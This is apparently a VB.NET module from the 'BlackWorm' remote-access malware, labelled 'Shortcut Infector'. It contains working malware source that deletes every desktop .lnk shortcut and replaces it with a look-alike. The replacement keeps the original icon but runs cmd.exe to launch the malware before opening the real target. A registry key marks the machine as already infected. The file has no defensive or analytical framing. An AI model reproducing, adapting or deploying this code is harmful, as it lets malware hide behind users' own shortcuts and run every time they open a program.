﻿Imports System.Windows.Forms

Public Class ShortcutInstall
    '********************************
    '********** By ʍᴙ.ώoŁƒ **********
    '-------                  -------
    '---------- Dev-Point -----------
    '-------                  -------
    '****** Shortcut Infector *******
    'Fixed By : Black.Hacker'
    Dim virustarget As String
    Public Sub ShortcutInfection()
        On Error Resume Next
        If RegValueGet("BlackWorm") = "True" Then
            Exit Sub
        Else
            RegValueSet("BlackWorm", "True")
        End If
        Dim DeskTop = Environment.GetFolderPath(Environment.SpecialFolder.Desktop) & "\"
        Dim file = IO.Directory.GetFiles(Environment.GetFolderPath(Environment.SpecialFolder.Desktop))
        Threading.Thread.Sleep(1000)
        If A.HardInstall = "True" Then
            virustarget = Environ(A.PathS) & "\Microsoft\MyClient\" & InstallName
        Else
            virustarget = Application.ExecutablePath
        End If

        For Each mw In file
            Dim lnk = IO.Path.GetExtension(mw)
            Dim name = IO.Path.GetFileNameWithoutExtension(mw)
            Dim lnkPath = IO.Path.GetFullPath(mw)
            If lnk = ".lnk" Then
                Dim namelnk = System.IO.Path.GetFileName(lnkPath)
                Dim WSH = CreateObject("WScript.Shell")
                Dim ExeLink = WSH.CreateShortcut(lnkPath)
                With CreateObject("WScript.Shell").CreateShortcut(DeskTop & namelnk)
                    .TargetPath = "cmd.exe"
                    .WorkingDirectory = ""
                    .Arguments = "/c start " & virustarget & " & explorer /root,""" & ExeLink.TargetPath.ToString & """ & exit"
                    .IconLocation = ExeLink.TargetPath.ToString
                    IO.File.Delete(lnkPath)
                    .Save()
                End With
            End If
        Next
    End Sub
    Public comp As Object = New Microsoft.VisualBasic.Devices.Computer
    Function RegValueGet(ByVal name As String) As String
        Try
            Return comp.Registry.CurrentUser.CreateSubKey("Software\" & "ShortCutInfection").GetValue(name, "")
        Catch ex As Exception
            Return "error < Not Found >"
        End Try
    End Function
    Function RegValueSet(ByVal name As String, ByVal values As String)
        Try
            comp.Registry.CurrentUser.CreateSubKey("Software\" & "ShortCutInfection").SetValue(name, values)
        Catch ex As Exception
        End Try
        Return Nothing
    End Function
End Class
